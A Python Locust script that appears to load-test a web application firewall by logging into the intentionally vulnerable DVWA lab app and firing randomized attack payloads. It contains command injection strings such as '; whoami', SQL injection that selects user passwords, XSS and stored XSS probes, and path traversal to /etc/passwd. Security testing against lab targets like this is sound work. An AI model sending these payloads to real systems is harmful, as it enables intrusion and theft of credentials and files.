
import os
import random
from locust import HttpUser, task, between
from bs4 import BeautifulSoup

# --- PAYLOADS ---
COMMAND_INJECTION_PAYLOADS = ['; whoami', '&& whoami', '| whoami', '; ls -la', '&& ls -la', '| ls -la', '$(whoami)', '`whoami`']
SQL_INJECTION_PAYLOADS = ["1' AND '1'='1", "1' AND SLEEP(1)--", "1' UNION SELECT user, password FROM users--"]
XSS_PAYLOADS = ["<script>alert('locust')</script>", "<img src=x onerror=alert('locust')>", "<svg onload=alert('locust')>"]
FILE_INCLUSION_PAYLOADS = ["../../../../../../../../etc/passwd", "../dvwa/images/logo.png", "http://example.com/somefile.txt"]

class DVWAUser(HttpUser):
    """
    Locust user class that simulates a user attacking the DVWA application.
    """
    # Wait time between tasks, can be adjusted. For high RPS, this should be low.
    wait_time = between(0.1, 0.5)
    
    def on_start(self):
        """
        Called when a virtual user starts. This will handle login and setting the security level.
        """
        self.username = os.environ.get("DVWA_USERNAME", "admin")
        self.password = os.environ.get("DVWA_PASSWORD", "password")
        self.security_level = "low"
        self.csrf_token_cache = {} # Cache for CSRF tokens

        print(f"[*] Virtual user starting. Attempting to log in as '{self.username}'...")
        
        # 1. Get login page to fetch initial CSRF token
        try:
            r = self.client.get("/login.php")
            soup = BeautifulSoup(r.text, 'html.parser')
            user_token = soup.find('input', {'name': 'user_token'})['value']
        except Exception:
            user_token = None # Fallback if token not found

        # 2. Post login credentials
        login_data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": user_token
        }
        res = self.client.post("/login.php", data=login_data)

        if "welcome.php" not in res.url and "index.php" not in res.url:
            print("[!] LOGIN FAILED. A virtual user could not log in. Stopping user.")
            self.environment.runner.quit()
            return

        # 3. Set security level
        print(f"[*] Login successful. Setting security to '{self.security_level}'")
        security_url = "/security.php"
        
        # Get token from security page
        r = self.client.get(security_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            security_token = soup.find('input', {'name': 'user_token'})['value']
        except Exception:
            print("[!] Could not find CSRF on security page. This might cause issues.")
            security_token = user_token # Fallback

        security_data = {
            "security": self.security_level,
            "seclev_submit": "Submit",
            "user_token": security_token
        }
        self.client.post(security_url, data=security_data)
        print("[+] Virtual user setup complete.")

    def _get_csrf_token(self, path):
        """Helper to get CSRF token for a specific page, with caching."""
        if path in self.csrf_token_cache:
            return self.csrf_token_cache[path]
        
        if self.security_level != "low":
            try:
                response = self.client.get(path)
                soup = BeautifulSoup(response.text, 'html.parser')
                token = soup.find('input', {'name': 'user_token'})['value']
                self.csrf_token_cache[path] = token
                return token
            except Exception:
                return None
        return None

    @task(1)
    def test_command_injection(self):
        payload = f"127.0.0.1{random.choice(COMMAND_INJECTION_PAYLOADS)}"
        self.client.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit"}, name="/vulnerabilities/exec/ [cmd]")

    @task(1)
    def test_sql_injection(self):
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        self.client.get(f"/vulnerabilities/sqli_blind/?id={payload}&Submit=Submit", name="/vulnerabilities/sqli_blind/ [sqli]")

    @task(1)
    def test_reflected_xss(self):
        payload = random.choice(XSS_PAYLOADS)
        self.client.get(f"/vulnerabilities/xss_r/?name={payload}", name="/vulnerabilities/xss_r/ [xss]")

    @task(1)
    def test_file_inclusion(self):
        payload = random.choice(FILE_INCLUSION_PAYLOADS)
        self.client.get(f"/vulnerabilities/fi/?page={payload}", name="/vulnerabilities/fi/ [fi]")

    @task(1)
    def test_stored_xss(self):
        path = "/vulnerabilities/xss_s/"
        token = self._get_csrf_token(path)
        payload = random.choice(XSS_PAYLOADS)
        
        post_data = {
            "txtName": "locust_user",
            "mtxMessage": payload,
            "btnSign": "Sign Guestbook",
        }
        if token:
            post_data["user_token"] = token
            
        self.client.post(path, data=post_data, name="/vulnerabilities/xss_s/ [stored_xss]")

if __name__ == "__main__":
    print("This script is intended to be run with Locust.")
    print("Example: locust -f waf_load_test.py --host http://192.168.18.177")
